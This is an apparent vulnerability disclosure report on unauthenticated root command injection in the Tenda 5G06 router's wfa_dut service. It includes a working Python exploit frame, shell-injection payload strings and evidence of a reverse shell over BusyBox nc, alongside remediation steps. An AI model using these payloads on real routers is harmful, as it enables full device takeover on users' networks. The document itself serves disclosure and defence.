# Finding R07: Unauthenticated Command Injection in Stock-Started WFA DUT Service

## Severity

Critical

Suggested CVSS v3.1:

```text
CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Score: 8.8 Critical
```

Rationale: the confirmed default listener is LAN-adjacent rather than proven WAN
reachable. If physical testing shows TCP/8000 is reachable from a broader
network segment, the attack vector should be raised accordingly.

## Affected Product

```text
Product: Tenda 5G06 / 5G06V1.0
Firmware: V05.06.01.29_multi_TDE01
Binary: /sbin/wfa_dut
Init: /etc/init.d/wfa_dut
Startup symlink: /etc/rc.d/S90wfa_dut
Default TCP port: 8000
```

## Summary

The firmware starts the Wi-Fi Alliance/Sigma Device Under Test daemon
`wfa_dut` during the stock boot sequence. In the close-to-stock `rc.d` boot
harness, `S90wfa_dut` launched `/sbin/wfa_dut` and the process listened on
`0.0.0.0:8000/tcp`.

`wfa_dut` accepts unauthenticated binary WFA control frames on this listener.
Several parsed command parameters are copied into shell command templates and
executed through shell-backed paths. An attacker who can reach TCP/8000 can
inject shell metacharacters into a WFA command parameter and execute commands as
root.

This does not require the Sigma control agent `wfa_ca`. `wfa_ca` can translate
human-readable Sigma CAPI text commands into the same binary frames, but direct
binary frames sent to `wfa_dut:8000` are sufficient for exploitation.

## Impact

Successful exploitation gives root command execution in the router firmware
environment. Practical impact includes:

- full device compromise from the LAN side
- Wi-Fi and network configuration manipulation
- persistence or startup script modification
- traffic generation or network abuse
- sensitive configuration disclosure
- denial of service

## Attack Surface and Reachability

Confirmed runtime binding in the procd-backed boot harness:

```text
0.0.0.0:8000/tcp  wfa_dut
```

`0.0.0.0` means the daemon is not bound only to loopback or to a single Wi-Fi
test interface. The kernel accepts connections on any active interface unless
firewall or bridge policy blocks them.

Firmware firewall defaults:

```text
lan zone input: ACCEPT
wan zone input: REJECT
```

Expected practical reachability:

```text
Wired LAN client      likely reachable
Main Wi-Fi client     likely reachable if bridged into LAN
Guest Wi-Fi client    not proven; guest is disabled in extracted config
WAN/cellular client   likely blocked by default firewall input policy
Internet remote       likely not reachable unless WAN exposure is changed
```

The remaining hardware validation item is physical-network exposure: confirm
from a real wired LAN host and main Wi-Fi client whether TCP/8000 is reachable
on the router management IP. The command injection itself is already confirmed
against the stock-started service.

## Root Cause

`wfa_dut` parses unauthenticated WFA control frames and inserts attacker-
controlled parameters into shell command strings without safe argument handling.

One confirmed vulnerable command maps to this static shell template:

```text
ifconfig %s > /tmp/ipconfig.txt
```

For the `sta_get_mac_address` WFA command, the `interface` parameter is inserted
into the `%s` position. A malicious value such as:

```text
ra0;echo DIRECT8000>/tmp/direct_8000;#
```

causes shell behavior equivalent to:

```sh
ifconfig ra0;echo DIRECT8000>/tmp/direct_8000;# > /tmp/ipconfig.txt
```

Other static shell-backed paths in `/sbin/wfa_dut` include:

```text
getipconfig.sh /tmp/ipconfig.txt %s
/sbin/ifconfig %s %s netmask %s > /dev/null 2>&1
/sbin/route add default gw %s > /dev/null 2>&1
ping %s -c 3 -W %u | grep loss | cut -f3 -d, 1>& /tmp/pingout.txt
wfaping.sh / wfaping6.sh traffic-generation helpers
wpa_cli / iwpriv Wi-Fi configuration helpers
```

## Evidence

### Stock Startup

The firmware contains:

```text
/etc/init.d/wfa_dut
/etc/rc.d/S90wfa_dut -> ../init.d/wfa_dut
```

The init script launches `wfa_dut` before `sigma`:

```text
/sbin/wfa_dut $wifi1_ifname 8000 &
/sbin/wfa_dut $wifi2_ifname 8080 &
/etc/init.d/sigma disable
```

In the extracted image, `/etc/wireless/l1profile.dat` provides:

```text
INDEX0_main_ifname=ra0;rai0
```

No `INDEX1_main_ifname` was present, so the first/default listener on `8000`
is the practical stock-started service in the harness.

Observed process and listener:

```text
/sbin/wfa_dut ra0;rai0 8000
0.0.0.0:8000/tcp LISTEN
```

### Direct Binary Protocol PoC

`wfa_dut` does not require `wfa_ca`; it accepts WFA binary TLV frames directly.
For `sta_get_mac_address`, the frame format used in the PoC is:

```text
uint16 little-endian tag    = 0x000c
uint16 little-endian length = 0x0274
payload                     = interface string, NUL-padded to 0x0274 bytes
total frame length          = 632 bytes
```

PoC frame:

```python
import socket
import struct

payload = b"ra0;echo DIRECT8000>/tmp/direct_8000;#"
frame = struct.pack("<HH", 12, 0x274) + payload.ljust(0x274, b"\x00")

s = socket.create_connection(("127.0.0.1", 8000), timeout=2)
s.settimeout(3)
s.sendall(frame)
print(s.recv(4096).hex())
```

Validated result:

```text
sent 632 bytes
received 524-byte WFA response
/tmp/direct_8000 created
/tmp/direct_8000 contents: DIRECT8000
```

This was sent directly to the default `wfa_dut:8000` listener.

### Sigma Text Frontend PoC

When `wfa_ca` is manually started and pointed at `wfa_dut`, the same bug is
reachable through human-readable Sigma CAPI text:

```text
sta_get_mac_address,interface,ra0;echo WFA_IFACE>/tmp/wfa_inj_iface;#
```

Observed response:

```text
status,RUNNING
status,COMPLETE,mac,00:00:00:00:00:00
```

Observed marker:

```text
/tmp/wfa_inj_iface contents: WFA_IFACE
```

Additional confirmed Sigma paths:

```text
sta_get_ip_config,interface,ra0;echo WFA_IPCFG>/tmp/wfa_inj_ipcfg;#
sta_set_ip_config,...,ip,1;>/tmp/x;#,...
```

These created `/tmp/wfa_inj_ipcfg` and `/tmp/x`, respectively.

### Reverse Shell Confirmation

The firmware rootfs does not include `bash`, but it includes BusyBox `sh` and
BusyBox `nc`:

```text
/bin/sh -> busybox
/usr/bin/nc -> ../../bin/busybox
```

A staged FIFO shell was triggered through the vulnerable
`sta_get_mac_address` parameter:

```text
sta_get_mac_address,interface,ra0;/bin/sh /tmp/r;#
```

Validated process evidence:

```text
/bin/sh -i
/usr/bin/nc 172.17.0.1 4444
172.17.0.6:48766 -> 172.17.0.1:4444 ESTABLISHED
```

## Reproduction Steps

These steps assume the procd-backed firmware harness used during analysis.
For physical hardware, replace `127.0.0.1` with the router's LAN IP and run
from a LAN-side client if TCP/8000 is reachable.

1. Confirm `wfa_dut` is listening:

```bash
docker exec tenda-b104-rcd-procd-20260421_214544 netstat -ltnp
```

Expected:

```text
0.0.0.0:8000 LISTEN wfa_dut
```

2. Send the direct WFA TLV payload:

```bash
docker exec tenda-b104-rcd-procd-20260421_214544 python3 - <<'PY'
import socket
import struct

payload = b"ra0;echo DIRECT8000>/tmp/direct_8000;#"
frame = struct.pack("<HH", 12, 0x274) + payload.ljust(0x274, b"\x00")

s = socket.create_connection(("127.0.0.1", 8000), timeout=2)
s.settimeout(3)
s.sendall(frame)

out = []
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        out.append(chunk)
except Exception:
    pass

print("sent", len(frame), "received", len(b"".join(out)), "bytes")
print(b"".join(out).hex())
PY
```

3. Verify the marker:

```bash
docker exec tenda-b104-rcd-procd-20260421_214544 sh -lc '
ROOT=/work/rcd-procd-20260421_214544/extracted/795453735379013_US_5G06V1.0mt_V05.06.01.29_multi_TDE01.zip/rootfs_0
ls -l "$ROOT/tmp/direct_8000"
cat "$ROOT/tmp/direct_8000"
'
```

Expected:

```text
DIRECT8000
```

## Remediation

Recommended fixes:

1. Do not start WFA/Sigma certification daemons in production firmware.
2. Remove `/etc/rc.d/S90wfa_dut` and `/etc/rc.d/S92sigma` from production
   builds, or gate them behind a physically enabled manufacturing mode.
3. If the service must remain available, bind it to loopback only and require
   authenticated local mediation.
4. Replace all shell string construction with direct `execve()`-style argument
   arrays or safe library calls.
5. Strictly validate WFA parameters such as interface names, IP addresses,
   gateway values, and traffic destinations before use.
6. Block TCP/8000 and TCP/9000 from all LAN, Wi-Fi, guest, and WAN zones unless
   an explicit manufacturing mode is active.

## Suggested Report Statement

An unauthenticated LAN-side attacker can send a crafted WFA binary control frame
to TCP/8000 on the router and execute shell commands as root. The vulnerable
service is started by the stock init sequence and binds to `0.0.0.0`. Default
firewall policy appears to block WAN-originated traffic, but LAN and main Wi-Fi
clients are expected to reach the listener unless hardware-specific bridge or
firewall policy blocks it.

